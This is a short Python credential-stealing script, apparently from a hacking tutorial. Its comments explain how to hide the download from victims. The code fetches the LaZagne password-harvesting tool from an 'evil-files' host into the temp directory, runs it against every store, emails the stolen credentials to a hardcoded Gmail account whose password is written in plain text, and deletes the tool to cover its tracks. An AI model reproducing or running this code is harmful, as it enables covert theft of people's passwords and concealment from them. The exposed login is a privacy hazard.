# the problem with our previous code is that if we execute that script, then a program called lazagne will be
# downloaded in the same working directory, which is suspecious to the users
# so we have to do 2 tasks:
# 1. download lazagne to any other directory which user mostly never visits e.g. temp directory
# 2. we have to remove this lazagne script as soon as our work is done

import requests, subprocess, smtplib, tempfile, os

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)        # this will take us to temp directory
download("10.0.2.7/evil-files/laZagne_x86.exe")
result = subprocess.check_output("laZagne_x86.exe all", shell=True)
send_email("vaibhavpaliwal620@gmail.com", "22-02-2002", result)
os.remove("laZagne_x86.exe")
